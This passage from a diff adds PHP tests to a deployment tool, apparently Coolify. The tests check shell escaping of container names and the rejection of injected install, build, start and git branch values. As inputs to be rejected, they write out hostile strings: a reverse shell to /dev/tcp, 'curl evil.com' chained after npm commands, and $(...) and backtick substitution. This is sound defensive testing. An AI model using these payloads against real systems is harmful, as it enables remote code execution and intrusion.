+            ->toContain(" 'app$(id)-svc-uuid' | grep -qxF 'coolify' || docker network connect --alias 'app$(id)-svc-uuid' 'coolify' 'app$(id)-svc-uuid' || echo 'Warning: Could not connect app$(id) to the coolify network.'");
+    });
+
+    test('docker status helper escapes container names', function (bool $isSwarm, string $expected) {
+        $server = (new Server)->forceFill(['id' => 1]);
+        $server->setRelation('settings', (new ServerSetting)->forceFill(['is_swarm_manager' => $isSwarm, 'is_swarm_worker' => false]));
+
+        expect(buildContainerStatusCommand($server, 'app$(id)'))->toBe($expected);
+    })->with([
+        'docker' => [false, "docker inspect --format '{{json .}}' 'app\$(id)'"],
+        'swarm' => [true, "docker service ls --filter 'name=app\$(id)' --format '{{json .}}' "],
+    ]);
+
+    test('application deployment shell commands escape the generated container name', function () {
+        $containerName = "app'; touch /tmp/pwn; '";
+        $escapedContainerName = escapeshellarg($containerName);
+        $commands = collect();
+        $job = new class($commands) extends ApplicationDeploymentJob
+        {
+            public function __construct(public Collection $capturedCommands) {}
+
+            public function execute_remote_command(...$commands)
+            {
+                foreach ($commands as $command) {
+                    $this->capturedCommands->push(data_get($command, 'command') ?? $command[0]);
+                }
+            }
+        };
+        $application = (new Application)->forceFill([
+            'health_check_enabled' => true,
+            'health_check_start_period' => 0,
+            'health_check_retries' => 1,
+            'health_check_interval' => 0,
+        ]);
+        $application->setRelation('settings', (new ApplicationSetting)->forceFill(['stop_grace_period' => 10]));
+        $server = (new Server)->forceFill(['id' => 1]);
+        $server->setRelation('settings', (new ServerSetting)->forceFill(['is_swarm_manager' => false, 'is_swarm_worker' => false]));
+        $queue = Mockery::mock(ApplicationDeploymentQueue::class)->makePartial();
+        $queue->shouldReceive('addLogEntry');
+        foreach ([
+            'application' => $application,
+            'application_deployment_queue' => $queue,
+            'server' => $server,
+            'container_name' => $containerName,
+            'deployment_uuid' => 'deploy-uuid',
+            'saved_outputs' => collect(),
+        ] as $property => $value) {
+            (new ReflectionProperty(ApplicationDeploymentJob::class, $property))->setValue($job, $value);
+        }
+
+        (new ReflectionMethod(ApplicationDeploymentJob::class, 'health_check'))->invoke($job);
+        (new ReflectionMethod(ApplicationDeploymentJob::class, 'query_logs'))->invoke($job);
+        (new ReflectionMethod(ApplicationDeploymentJob::class, 'graceful_shutdown_container'))->invoke($job, $containerName);
+
+        expect($commands->all())
+            ->toContain("docker inspect --format='{{json .State.Health.Status}}' {$escapedContainerName}")
+            ->toContain("docker inspect --format='{{json .State.Health.Log}}' {$escapedContainerName}")
+            ->toContain("docker logs -n 100 {$escapedContainerName}")
+            ->toContain(dockerStopCommand(10, $escapedContainerName, $server))
+            ->and($commands->implode("\n"))->not->toContain(" {$containerName}");
+    });
+});
+
+describe('install/build/start command validation', function () {
+    test('rejects semicolon injection in install_command', function () {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['install_command' => 'npm install; curl evil.com'],
+            ['install_command' => $rules['install_command']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    });
+
+    test('rejects pipe injection in build_command', function () {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['build_command' => 'npm run build | curl evil.com'],
+            ['build_command' => $rules['build_command']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    });
+
+    test('rejects command substitution in start_command', function () {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['start_command' => 'npm start $(whoami)'],
+            ['start_command' => $rules['start_command']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    });
+
+    test('rejects backtick injection in install_command', function () {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['install_command' => 'npm install `whoami`'],
+            ['install_command' => $rules['install_command']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    });
+
+    test('rejects dollar sign in build_command', function () {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['build_command' => 'npm run build $HOME'],
+            ['build_command' => $rules['build_command']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    });
+
+    test('rejects reverse shell payload in install_command', function () {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['install_command' => '"; bash -i >& /dev/tcp/172.23.0.1/1337 0>&1; #'],
+            ['install_command' => $rules['install_command']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    });
+
+    test('rejects newline injection in start_command', function () {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['start_command' => "npm start\ncurl evil.com"],
+            ['start_command' => $rules['start_command']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    });
+
+    test('allows valid install commands', function ($cmd) {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['install_command' => $cmd],
+            ['install_command' => $rules['install_command']]
+        );
+
+        expect($validator->fails())->toBeFalse();
+    })->with([
+        'npm install',
+        'yarn install --frozen-lockfile',
+        'pip install -r requirements.txt',
+        'bun install',
+        'pnpm install --no-frozen-lockfile',
+    ]);
+
+    test('allows valid build commands', function ($cmd) {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['build_command' => $cmd],
+            ['build_command' => $rules['build_command']]
+        );
+
+        expect($validator->fails())->toBeFalse();
+    })->with([
+        'npm run build',
+        'cargo build --release',
+        'go build -o main .',
+        'yarn build && yarn postbuild',
+        'make build',
+    ]);
+
+    test('allows valid start commands', function ($cmd) {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['start_command' => $cmd],
+            ['start_command' => $rules['start_command']]
+        );
+
+        expect($validator->fails())->toBeFalse();
+    })->with([
+        'npm start',
+        'node server.js',
+        'python main.py',
+        'java -jar app.jar',
+        './start.sh',
+    ]);
+
+    test('allows null values for command fields', function ($field) {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            [$field => null],
+            [$field => $rules[$field]]
+        );
+
+        expect($validator->fails())->toBeFalse();
+    })->with(['install_command', 'build_command', 'start_command']);
+});
+
+describe('git_branch validation rules survive array_merge in controller', function () {
+    test('git_branch uses ValidGitBranch in shared application rules', function () {
+        $rules = sharedDataApplications();
+
+        expect($rules['git_branch'])->toBeArray();
+        expect(collect($rules['git_branch'])->contains(fn ($rule) => $rule instanceof ValidGitBranch))->toBeTrue();
+    });
+
+    test('git_branch rejects shell metacharacter payloads', function (string $payload) {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['git_branch' => $payload],
+            ['git_branch' => $rules['git_branch']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    })->with([
+        'semicolon command separator' => 'main;touch /tmp/pwned;#',
+        'command substitution' => 'main$(touch /tmp/pwned)',
+        'backtick substitution' => 'main`touch /tmp/pwned`',
+        'pipe operator' => 'main|id',
+        'newline injection' => "main\ntouch /tmp/pwned",
+        'redirect operator' => 'main>/tmp/pwned',
+        'single quote breakout' => "main';id;#",
+    ]);
+
+    test('git_branch accepts safe branch names', function (string $branch) {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['git_branch' => $branch],
+            ['git_branch' => $rules['git_branch']]
+        );
+
+        expect($validator->fails())->toBeFalse();
+    })->with([
+        'main',
+        'feature/my-branch',
+        'release_1.2.3',
+    ]);
+});
